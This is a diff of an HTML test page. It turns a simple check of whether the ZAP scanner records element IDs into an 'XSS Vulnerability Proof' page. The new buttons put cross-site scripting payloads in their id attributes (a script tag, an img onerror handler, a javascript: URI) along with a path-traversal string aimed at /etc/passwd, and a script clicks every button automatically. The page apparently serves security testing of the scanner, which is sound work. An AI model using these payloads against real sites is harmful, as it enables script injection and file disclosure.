@@ -1,27 +1,40 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h2>Test: Does ZAP Record Element IDs?</h2>
+    <h2>ZAP XSS Vulnerability Proof</h2>
     
-    <!-- Element with simple ID -->
-    <button id="simple_id" onclick="alert('simple')">Button with Simple ID</button>
+    <!-- Malicious elements with XSS in IDs -->
+    <button id='malicious_id_<script>alert("XSS1")</script>' onclick="alert('clicked')">
+        Button 1 - XSS in ID
+    </button>
+    <br><br>
     
-    <!-- Element with complex ID -->
-    <button id="complex_id_with-special.chars" onclick="alert('complex')">Button with Complex ID</button>
+    <button id='malicious_id_<img src=x onerror=alert("XSS2")>' onclick="alert('clicked')">
+        Button 2 - XSS in ID  
+    </button>
+    <br><br>
     
-    <!-- Element with numeric ID -->
-    <button id="12345" onclick="alert('numeric')">Button with Numeric ID</button>
-    
-    <!-- Element with no ID -->
-    <button onclick="alert('no id')">Button with No ID</button>
+    <button id='malicious_id_javascript:alert("XSS3")' onclick="alert('clicked')">
+        Button 3 - JS Protocol in ID
+    </button>
+    <br><br>
+
+    <button id='malicious_id_../../etc/passwd' onclick="alert('clicked')">
+        Button 4 - Path Traversal in ID
+    </button>
+    <br><br>
 
     <script>
-        // Click all buttons automatically after 2 seconds
+        // Auto-click all buttons after 3 seconds
         setTimeout(() => {
-            document.querySelectorAll('button').forEach(btn => {
-                btn.click();
+            const buttons = document.querySelectorAll('button');
+            buttons.forEach((button, index) => {
+                setTimeout(() => {
+                    button.click();
+                    console.log('Clicked:', button.id);
+                }, index * 1000);
             });
-        }, 2000);
+        }, 3000);
     </script>
 </body>
 </html>
